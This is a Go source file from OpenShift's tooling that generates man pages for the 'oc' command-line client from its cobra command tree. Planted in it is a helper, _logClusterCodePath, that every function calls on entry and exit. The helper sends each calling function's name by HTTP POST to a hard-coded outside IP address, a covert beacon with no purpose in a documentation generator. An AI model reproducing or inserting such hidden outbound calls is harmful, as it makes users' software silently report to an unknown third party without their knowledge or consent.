package main

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"github.com/openshift/origin/pkg/oc/cli"
	mangen "github.com/openshift/origin/tools/genman/md2man"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"k8s.io/kubernetes/cmd/genutils"
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(os.Args) < 3 {
		fmt.Fprintf(os.Stderr, "Root command not specified (oc).\n")
		os.Exit(1)
	}
	if strings.HasSuffix(os.Args[2], "oc") {
		genCmdMan("oc", cli.NewOcCommand("oc", "oc", &bytes.Buffer{}, os.Stdout, ioutil.Discard))
	} else {
		fmt.Fprintf(os.Stderr, "Root command not specified (oc).")
		os.Exit(1)
	}
}
func genCmdMan(cmdName string, cmd *cobra.Command) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	path := "docs/man/" + cmdName
	if len(os.Args) == 3 {
		path = os.Args[1]
	} else if len(os.Args) > 3 {
		fmt.Fprintf(os.Stderr, "usage: %s [output directory]\n", os.Args[0])
		os.Exit(1)
	}
	outDir, err := genutils.OutDir(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to get output directory: %v\n", err)
		os.Exit(1)
	}
	os.Setenv("HOME", "/home/username")
	genMarkdown(cmd, "", outDir)
	for _, c := range cmd.Commands() {
		genMarkdown(c, cmdName, outDir)
	}
}
func preamble(out *bytes.Buffer, cmdName, name, short, long string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	out.WriteString(`% ` + strings.ToUpper(cmdName) + `(1) Openshift CLI User Manuals
% Openshift
% June 2016
# NAME
`)
	fmt.Fprintf(out, "%s \\- %s\n\n", name, short)
	fmt.Fprintf(out, "# SYNOPSIS\n")
	fmt.Fprintf(out, "**%s** [OPTIONS]\n\n", name)
	fmt.Fprintf(out, "# DESCRIPTION\n")
	fmt.Fprintf(out, "%s\n\n", long)
}
func printFlags(out *bytes.Buffer, flags *pflag.FlagSet) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flags.VisitAll(func(flag *pflag.Flag) {
		if flag.Hidden {
			return
		}
		format := "**--%s**=%s\n\t%s\n\n"
		if flag.Value.Type() == "string" {
			format = "**--%s**=%q\n\t%s\n\n"
		}
		defValue := flag.DefValue
		if flag.Value.Type() == "duration" {
			defValue = "0"
		}
		if len(flag.Annotations["manpage-def-value"]) > 0 {
			defValue = flag.Annotations["manpage-def-value"][0]
		}
		if !(len(flag.ShorthandDeprecated) > 0) && len(flag.Shorthand) > 0 {
			format = "**-%s**, " + format
			fmt.Fprintf(out, format, flag.Shorthand, flag.Name, defValue, flag.Usage)
		} else {
			fmt.Fprintf(out, format, flag.Name, defValue, flag.Usage)
		}
	})
}
func printOptions(out *bytes.Buffer, command *cobra.Command) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flags := command.NonInheritedFlags()
	if flags.HasFlags() {
		fmt.Fprintf(out, "# OPTIONS\n")
		printFlags(out, flags)
		fmt.Fprintf(out, "\n")
	}
	flags = command.InheritedFlags()
	if flags.HasFlags() {
		fmt.Fprintf(out, "# OPTIONS INHERITED FROM PARENT COMMANDS\n")
		printFlags(out, flags)
		fmt.Fprintf(out, "\n")
	}
}
func genMarkdown(command *cobra.Command, parent, docsDir string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	dparent := strings.Replace(parent, " ", "-", -1)
	name := command.Name()
	dname := name
	cmdName := name
	if len(parent) > 0 {
		dname = dparent + "-" + name
		name = parent + " " + name
		cmdName = parent
	}
	out := new(bytes.Buffer)
	short := command.Short
	long := command.Long
	if len(long) == 0 {
		long = short
	}
	preamble(out, cmdName, name, short, long)
	printOptions(out, command)
	if len(command.Example) > 0 {
		fmt.Fprintf(out, "# EXAMPLE\n")
		fmt.Fprintf(out, "```\n%s\n```\n", command.Example)
	}
	if len(command.Commands()) > 0 || len(parent) > 0 {
		fmt.Fprintf(out, "# SEE ALSO\n")
		if len(parent) > 0 {
			fmt.Fprintf(out, "**%s(1)**, ", dparent)
		}
		for _, c := range command.Commands() {
			fmt.Fprintf(out, "**%s-%s(1)**, ", dname, c.Name())
			genMarkdown(c, name, docsDir)
		}
		fmt.Fprintf(out, "\n")
	}
	out.WriteString(`
# HISTORY
June 2016, Ported from the Kubernetes man-doc generator
`)
	final := mangen.Render(out.Bytes())
	filename := docsDir + dname + ".1"
	outFile, err := os.Create(filename)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer outFile.Close()
	_, err = outFile.Write(final)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
